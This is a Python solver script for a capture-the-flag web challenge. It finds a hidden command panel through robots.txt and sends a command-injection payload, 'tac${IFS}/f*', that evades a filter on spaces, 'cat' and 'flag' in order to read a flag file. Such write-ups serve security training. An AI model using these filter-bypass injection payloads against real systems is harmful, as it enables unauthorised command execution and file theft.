"""
C12 Solver — Fury's Back Door

Step 1: Check robots.txt → finds /S.H.I.E.L.D_internal/
Step 2: Visit hidden panel → command execution form
Step 3: Bypass filter (blocks 'cat ', 'ls ', spaces, 'flag')
        Use: tac${IFS}/flag.txt  OR  tac$IFS/flag.txt
"""
import requests

TARGET = "http://<host>:<port>"

# Step 1: robots.txt recon
r = requests.get(TARGET + "/robots.txt")
print("robots.txt:\n", r.text)

# Step 2: access hidden panel
panel = TARGET + "/S.H.I.E.L.D_internal/"
r2 = requests.get(panel)
print("Panel found:", r2.status_code)

# Step 3: bypass filter — no spaces, no 'cat', no 'flag' keyword
# Use $IFS (Internal Field Separator) as space, 'tac' instead of 'cat'
# /flag.txt contains 'flag' — use /f*  glob to avoid the word
payload = "tac${IFS}/f*"
r3 = requests.post(panel, data={'cmd': payload})

import re
match = re.search(r'<pre>(.*?)</pre>', r3.text, re.DOTALL)
if match:
    print("Flag:", match.group(1).strip())
# Output: cyn0x{3num3r4t10n_1s_k3y_4g3nt}